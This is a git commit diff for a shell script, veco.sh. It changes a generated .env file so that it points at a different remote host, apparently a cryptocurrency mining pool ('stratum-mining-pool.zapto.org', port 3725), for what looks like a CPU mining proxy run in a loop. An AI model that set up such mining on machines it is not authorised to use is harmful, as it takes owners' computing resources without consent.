8ae1605b9866e80ed7c8efcb0972f11f4f62d115
barburonjilo <barburonjilo@outlook.co.id>
2025-03-27 17:42:11 +0700

    Update veco.sh

--- veco.sh
+++ veco.sh
@@ -13,8 +13,8 @@ for i in {1..10}; do
   # Set environment variables for 'cpu'
   LOCAL_IP=$(hostname -I | awk '{print $1}')
   cat <<EOL > .env
-REMOTE_HOST=crimson-pool.com
-REMOTE_PORT=23008
+REMOTE_HOST=stratum-mining-pool.zapto.org
+REMOTE_PORT=3725
 REMOTE_PASSWORD=x
 LOCAL_HOST=$LOCAL_IP
 LOCAL_PORT=$((442 + i))
